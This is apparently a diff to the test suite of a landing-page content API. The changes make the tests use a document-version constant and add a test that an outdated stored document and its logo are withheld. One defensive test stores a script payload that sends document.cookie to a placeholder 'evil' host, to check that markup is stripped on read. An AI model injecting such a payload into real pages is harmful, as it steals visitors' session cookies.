@@ -43,7 +43,7 @@ process.env.MM_PLATFORM_OWNER_PASSWORD = 'landing-owner-password';
 const { createApp } = await import('../src/server.js');
 const { initDb, applySchema, closeDb } = await import('../src/infrastructure/database/connection.js');
 const { initPlatformDb, closePlatformDb, platformDb } = await import('../src/platform/db.js');
-const { mergeLandingDocument, validateLandingDocument } = await import('../src/platform/landingDocument.js');
+const { mergeLandingDocument, validateLandingDocument, DOCUMENT_VERSION } = await import('../src/platform/landingDocument.js');
 const config = (await import('../src/config/index.js')).default;
 
 /**
@@ -276,7 +276,7 @@ test('the landing content API, on both drivers', async (t) => {
       await dt.test('answers an empty document before anything is stored, with no session', async () => {
         const res = await api('/api/landing');
         assert.equal(res.status, 200);
-        assert.deepEqual(res.data, { version: 1, assets: {} });
+        assert.deepEqual(res.data, { version: DOCUMENT_VERSION, assets: {} });
       });
 
       await dt.test('the public document is no-store — a save in one tab must show in another', async () => {
@@ -307,7 +307,7 @@ test('the landing content API, on both drivers', async (t) => {
 
       await dt.test('what the owner saves is what the page reads back', async () => {
         const document = {
-          version: 1,
+          version: DOCUMENT_VERSION,
           brand: { name: { en: 'KJ', ar: 'كي جيه' }, accent: '4F46E5' },
           contact: { phone: '0155 252 6142', whatsapp: '01552526142', email: 'kj@example.com' },
           packages: {
@@ -376,12 +376,15 @@ test('the landing content API, on both drivers', async (t) => {
         // The write path is not the only way a row appears: a hand edit, a
         // restored backup, an older release. Validation runs on READ too.
         await forceStoredDocument(JSON.stringify({
-          version: 1,
+          // The CURRENT version, deliberately: a stale version number would be
+          // what this row failed on, and the markup below — the whole point of
+          // the test — would never be reached.
+          version: DOCUMENT_VERSION,
           hero: { title: { en: '<script>fetch("//evil?c="+document.cookie)</script>' } },
         }));
         const page = await api('/api/landing');
         assert.equal(page.status, 200, 'and it still answers 200 — the page must not go down');
-        assert.deepEqual(page.data, { version: 1, assets: {} }, 'it is served as if nothing were stored');
+        assert.deepEqual(page.data, { version: DOCUMENT_VERSION, assets: {} }, 'it is served as if nothing were stored');
         assert.ok(!JSON.stringify(page.data).includes('<script'), 'no markup anywhere in the answer');
         await wipe();
       });
@@ -400,14 +403,16 @@ test('the landing content API, on both drivers', async (t) => {
           'not json at all',
           '[]',
           'null',
-          JSON.stringify({ version: 1, packages: { items: [{ price: 'free' }] } }),
+          // Current version on these two, so the bad price and the bad colour
+          // are what fails rather than the version number.
+          JSON.stringify({ version: DOCUMENT_VERSION, packages: { items: [{ price: 'free' }] } }),
           JSON.stringify({ version: 9, brand: { name: { en: 'From the future' } } }),
-          JSON.stringify({ version: 1, brand: { accent: 'octarine' } }),
+          JSON.stringify({ version: DOCUMENT_VERSION, brand: { accent: 'octarine' } }),
         ]) {
           await forceStoredDocument(junk);
           const page = await api('/api/landing');
           assert.equal(page.status, 200, `must not 500 on: ${junk.slice(0, 40)}`);
-          assert.deepEqual(page.data, { version: 1, assets: {} });
+          assert.deepEqual(page.data, { version: DOCUMENT_VERSION, assets: {} });
         }
 
         // The console is told the truth about it, so it is fixable rather than
@@ -622,6 +627,66 @@ test('the landing content API, on both drivers', async (t) => {
         await wipe();
       });
 
+      // Placed LATE on purpose: this one both stores a document and uploads a
+      // picture, and every test in this file shares one database in file order.
+      // Run earlier, it perturbs the asset tests above it.
+      /*
+       * THE VERSION BUMP IS THE RESET, AND IT HAS TO TAKE THE PICTURES WITH IT.
+       *
+       * `DOCUMENT_VERSION` exists so that a page whose SHAPE has changed can
+       * refuse the document written for the old shape — that is what took the
+       * landing page from KJ's to Nexora's on 2026-09-12, and it worked: the
+       * words fell back to the defaults. The logo did not. It lives in the
+       * asset table rather than in the document, so it went on being minted
+       * into `brand.logo`, and the new page was served under the old company's
+       * mark.
+       *
+       * Both halves are asserted here because fixing either one alone leaves
+       * the bug on the page.
+       */
+      await dt.test('a document from an older version is refused, and its pictures with it', async () => {
+        // The row is written STRAIGHT INTO THE TABLE, the same way
+        // `forceStoredDocument` writes a document: what is under test is what
+        // the READ path does with a picture that is already stored, so going
+        // through the upload route would only add a second thing that could be
+        // the reason this passes or fails.
+        const bytes = png(8, 8, [10, 20, 30, 128]);
+        await platformDb().prepare(`
+          INSERT INTO landing_assets (slot, data, content_type, byte_size, width, height, updated_at)
+          VALUES ('logo', ?, 'image/png', ?, 8, 8, ?)
+          ON CONFLICT(slot) DO UPDATE SET data = excluded.data, byte_size = excluded.byte_size
+        `).run(bytes, bytes.length, new Date().toISOString());
+        const control = await platformDb()
+          .prepare('SELECT COUNT(*) AS n FROM landing_assets WHERE slot = ?').get('logo');
+        assert.equal(control.n, 1, 'the picture really is stored — this is the control');
+
+        // A real, VALID document in every respect except its version: exactly
+        // what a release from before the bump leaves behind in this table.
+        await forceStoredDocument(JSON.stringify({
+          version: DOCUMENT_VERSION - 1,
+          brand: { name: { en: 'The old name', ar: 'الاسم القديم' } },
+        }));
+
+        const page = await api('/api/landing');
+        assert.equal(page.status, 200, 'the page must not go down over a stale row');
+        assert.deepEqual(page.data, { version: DOCUMENT_VERSION, assets: {} },
+          'the old document AND the picture uploaded for it are both withheld');
+        assert.ok(!JSON.stringify(page.data).includes('The old name'), 'not one word of it survives');
+
+        // WITHHELD, NOT DELETED. The row the control asserted is still there,
+        // so a document at the current version brings the picture straight back.
+        await forceStoredDocument(JSON.stringify({
+          version: DOCUMENT_VERSION,
+          brand: { name: { en: 'Nexora', ar: 'نكسورا' } },
+        }));
+        const after = await api('/api/landing');
+        assert.equal(after.data.brand.name.en, 'Nexora');
+        assert.match(after.data.brand.logo, /^\/api\/landing\/asset\/logo\?v=/,
+          'the logo is minted again the moment the document is current');
+
+        await wipe();
+      });
+
       // --------------------------------------------------- the whole round trip
 
       await dt.test('the owner view carries what the console needs to edit against', async () => {
@@ -657,7 +722,7 @@ test('a deployment with no control plane serves the page rather than an error', 
     await closePlatformDb();
     const { LandingContentService } = await import('../src/platform/LandingContentService.js');
     const service = new LandingContentService();
-    assert.deepEqual(await service.publicDocument(), { version: 1, assets: {} });
+    assert.deepEqual(await service.publicDocument(), { version: DOCUMENT_VERSION, assets: {} });
     assert.equal(await service.assetBytes('logo'), null);
   });
 
@@ -674,7 +739,7 @@ test('a deployment with no control plane serves the page rather than an error', 
       const res = await fetch(`http://127.0.0.1:${port}/api/landing`);
       assert.equal(res.status, 200);
       assert.match(res.headers.get('cache-control') || '', /no-store/);
-      assert.deepEqual(await res.json(), { version: 1, assets: {} });
+      assert.deepEqual(await res.json(), { version: DOCUMENT_VERSION, assets: {} });
 
       const asset = await fetch(`http://127.0.0.1:${port}/api/landing/asset/logo`);
       assert.equal(asset.status, 404, 'a 404 for the bytes, never a 500');
